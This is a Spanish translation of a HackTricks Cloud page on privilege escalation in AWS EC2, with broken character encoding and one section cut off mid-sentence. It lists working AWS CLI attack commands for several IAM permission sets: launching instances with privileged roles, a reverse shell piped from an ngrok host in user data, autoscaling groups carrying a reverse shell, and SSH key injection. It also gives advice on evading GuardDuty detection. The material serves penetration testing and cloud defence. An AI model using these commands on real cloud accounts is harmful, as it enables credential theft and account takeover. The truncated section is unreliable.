# AWS - EC2 Privesc

<details>

<summary><strong>¬°Apoya a HackTricks y obt√©n beneficios!</strong></summary>

* Si quieres ver a tu **empresa anunciada en HackTricks** o si quieres acceder a la **√∫ltima versi√≥n de PEASS o descargar HackTricks en PDF** ¬°Consulta los [**PLANES DE SUSCRIPCI√ìN**](https://github.com/sponsors/carlospolop)!
* Obt√©n el [**oficial PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colecci√≥n de exclusivos [**NFTs**](https://opensea.io/collection/the-peass-family)
* **√önete al** üí¨ [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **s√≠gueme** en **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Comparte tus trucos de hacking enviando PR a los repositorios de** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github.

</details>

## EC2

Para obtener m√°s **informaci√≥n sobre EC2** consulta:

{% content-ref url="../aws-services/aws-ec2-ebs-elb-ssm-vpc-and-vpn-enum/" %}
[aws-ec2-ebs-elb-ssm-vpc-and-vpn-enum](../aws-services/aws-ec2-ebs-elb-ssm-vpc-and-vpn-enum/)
{% endcontent-ref %}

### `iam:PassRole`, `ec2:RunInstances`

Un atacante con los permisos `iam:PassRole` y `ec2:RunInstances` puede **crear una nueva instancia de EC2** a la que tendr√° acceso al sistema operativo y **pasarle un perfil de instancia de EC2 existente**. Luego puede iniciar sesi√≥n en la instancia y **solicitar las claves de AWS asociadas a ese perfil de instancia de EC2**, lo que le da acceso a todos los permisos que tiene el perfil de instancia/servicio asociado.

* **Acceso a trav√©s de SSH**

Puede ejecutar una nueva instancia usando una **clave ssh creada** (`--key-name`) y luego conectarse a ella a trav√©s de ssh (si desea crear una nueva, es posible que necesite el permiso `ec2:CreateKeyPair`).

```bash
aws ec2 run-instances --image-id ami-a4dc46db --instance-type t2.micro \
    --iam-instance-profile Name=iam-full-access-ip --key-name my_ssh_key \
    --security-group-ids sg-123456
```

* **Acceso a trav√©s de rev shell en user data**

Puede ejecutar una nueva instancia usando una **user data** (`--user-data`) que le enviar√° una **rev shell**. No es necesario especificar el grupo de seguridad de esta manera.

```bash
echo '#!/bin/bash
curl https://reverse-shell.sh/4.tcp.ngrok.io:17031 | bash' > /tmp/rev.sh

aws ec2 run-instances --image-id ami-0c1bc246476a5572b --instance-type t2.micro \
   --iam-instance-profile Name=EC2-CloudWatch-Agent-Role \
   --count 1 \
   --user-data "file:///tmp/rev.sh"
```

Una nota importante sobre este ataque es que un **indicador obvio de compromiso** es cuando se usan **credenciales de perfil de instancia de EC2 fuera de la instancia espec√≠fica**. Incluso AWS GuardDuty se activa en esto (https://docs.aws.amazon.com/guardduty/latest/ug/guardduty\_finding-types.html#unauthorized11), por lo que no es una buena idea extraer estas credenciales y ejecutarlas localmente, sino **acceder a la API de AWS desde dentro de esa instancia de EC2**.

**Impacto potencial:** Privesc directo a cualquier rol de EC2 adjunto a perfiles de instancia existentes.

#### Privesc a ECS

Con este conjunto de permisos, tambi√©n podr√≠a **crear una instancia de EC2 y registrarla dentro de un cl√∫ster ECS**. De esta manera, los **servicios ECS** se **ejecutar√°n** dentro de la **instancia EC2** a la que tiene acceso y luego puede penetrar en esos servicios (contenedores docker) y **robar los roles ECS adjuntos**.

```bash
aws ec2 run-instances \
    --image-id ami-07fde2ae86109a2af \
    --instance-type t2.micro \
    --iam-instance-profile <ECS_role> \
    --count 1 --key-name pwned \
    --user-data "file:///tmp/asd.sh" 

# Aseg√∫rese de usar una AMI optimizada para ECS ya que ya tiene todo instalado para ECS (amzn2-ami-ecs-hvm-2.0.20210520-x86_64-ebs)
# El perfil de instancia de EC2 necesita acceso b√°sico a ECS
# El contenido de la user data es:
#!/bin/bash
echo ECS_CLUSTER=<cluster-name> >> /etc/ecs/ecs.config;echo ECS_BACKEND_HOST= >> /etc/ecs/ecs.config;
```

Para aprender c√≥mo **forzar a los servicios ECS a ejecutarse** en esta nueva instancia de EC2, consulte:

{% content-ref url="aws-ecs-privesc.md" %}
[aws-ecs-privesc.md](aws-ecs-privesc.md)
{% endcontent-ref %}

Si **no puede crear una nueva instancia** pero tiene el permiso `ecs:RegisterContainerInstance`, es posible que pueda registrar la instancia dentro del cl√∫ster y realizar el ataque comentado.

**Impacto potencial:** Privesc directo a roles ECS adjuntos a tareas.

### **`iam:PassRole`,** **`iam:AddRoleToInstanceProfile`**

Similar al escenario anterior, un atacante con estos permisos podr√≠a **cambiar el rol IAM de una instancia comprometida** para que pueda robar nuevas credenciales.\
Como un perfil de instancia solo puede
### `autoscaling:CreateLaunchConfiguration`,`autoscaling:CreateAutoScalingGroup`,`iam:PassRole`

Un atacante con los permisos **`autoscaling:CreateLaunchConfiguration`,`autoscaling:CreateAutoScalingGroup`,`iam:PassRole`** puede **crear una configuraci√≥n de lanzamiento** con un **Rol IAM** y un **rev shell** dentro de los **datos de usuario**, luego **crear un grupo de escalado autom√°tico** a partir de esa configuraci√≥n y esperar a que el rev shell **robe el Rol IAM**.

```bash
aws --profile "$NON_PRIV_PROFILE_USER" autoscaling create-launch-configuration \
   --launch-configuration-name bad_config \
   --image-id ami-0c1bc246476a5572b \
   --instance-type t3.micro \
   --iam-instance-profile EC2-CloudWatch-Agent-Role \
   --user-data "$REV"

aws --profile "$NON_PRIV_PROFILE_USER" autoscaling create-auto-scaling-group \
   --auto-scaling-group-name bad_auto \
   --min-size 1 --max-size 1 \
   --launch-configuration-name bad_config \
   --desired-capacity 1 \
   --vpc-zone-identifier "subnet-e282f9b8"
```

**Impacto potencial:** Escalada de privilegios directa a un rol EC2 diferente.

### `!autoscaling`

El conjunto de permisos **`ec2:CreateLaunchTemplate`** y **`autoscaling:CreateAutoScalingGroup`** **no son suficientes para escalar** privilegios a un rol IAM porque para adjuntar el rol especificado en la Configuraci√≥n de Lanzamiento o en la Plantilla de Lanzamiento **necesita los permisos `iam:PassRole` y `ec2:RunInstances`** (que es una escalada de privilegios conocida).

### `ec2-instance-connect:SendSSHPublicKey`

Un atacante con el permiso **`ec2-instance-connect:SendSSHPublicKey`** puede agregar una clave ssh a un usuario y usarla para acceder a ella (si tiene acceso ssh a la instancia) o para escalar privilegios.

```bash
aws ec2-instance-connect send-ssh-public-key \
   --instance-id "$INSTANCE_ID" \
   --instance-os-user "ec2-user" \
   --ssh-public-key "file://$PUBK_PATH"
```

**Impacto potencial:** Escalada de privilegios directa a los roles IAM de EC2 adjuntos a las instancias en ejecuci√≥n.

### `ec2-instance-connect:SendSerialConsoleSSHPublicKey`

Un atacante con el permiso **`ec2-instance-connect:SendSerialConsoleSSHPublicKey`** puede **agregar una clave ssh a una conexi√≥n serial**. Si la conexi√≥n serial no est√° habilitada, el atacante necesita el permiso **`ec2:EnableSerialConsoleAccess` para habilitarla**.

Para conectarse al puerto serie tambi√©n **necesita conocer el nombre de usuario y la contrase√±a de un usuario** dentro de la m√°quina.

```bash
aws ec2 enable-serial-console-access

aws ec2-instance-connect send-serial-console-ssh-public-key \
   --instance-id "$INSTANCE_ID" \
   --serial-port 0 \
   --region "eu-west-1" \
   --ssh-public-key "file://$PUBK_PATH"

ssh -i /tmp/priv $INSTANCE_ID.port0@serial-console.ec2-instance-connect.eu-west-1.aws
```

De esta manera no es muy √∫til para la escalada de privilegios ya que se necesita conocer un nombre de usuario y una contrase√±a para explotarlo.

**Impacto potencial:** (Altamente improbable) Escalada de privilegios directa a los roles IAM de EC2 adjuntos a las instancias en ejecuci√≥n.